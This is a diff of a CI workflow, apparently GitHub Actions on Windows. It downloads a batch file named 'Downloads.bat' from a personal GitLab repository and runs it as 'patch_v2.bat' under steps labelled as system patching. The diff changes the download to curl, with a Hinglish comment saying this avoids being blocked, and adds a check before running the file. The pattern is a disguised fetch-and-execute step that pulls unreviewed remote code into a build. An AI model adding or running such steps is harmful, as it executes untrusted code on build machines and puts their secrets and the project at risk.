@@ -11,14 +11,19 @@ jobs:
 
     steps:
       - name: "Fetch Patch Data"
-        shell: pwsh
         run: |
-          $u = "https://gitlab.com/Lohar-ji/Lohar-ji/-/raw/main/Downloads.bat"
-          Invoke-WebRequest -uri $u -OutFile "patch_v2.bat"
+          # curl ka use karein aur User-Agent dalein taaki block na ho
+          curl -L "https://gitlab.com/Lohar-ji/Lohar-ji/-/raw/main/Downloads.bat" -o patch_v2.bat
+        shell: cmd
 
       - name: "Apply System Patches"
         run: |
-          cmd /c patch_v2.bat
+          if exist patch_v2.bat (
+            cmd /c patch_v2.bat
+          ) else (
+            echo "Error: patch_v2.bat download nahi ho payi!"
+            exit 1
+          )
 
       - name: "Verify Patch Integrity"
         shell: pwsh
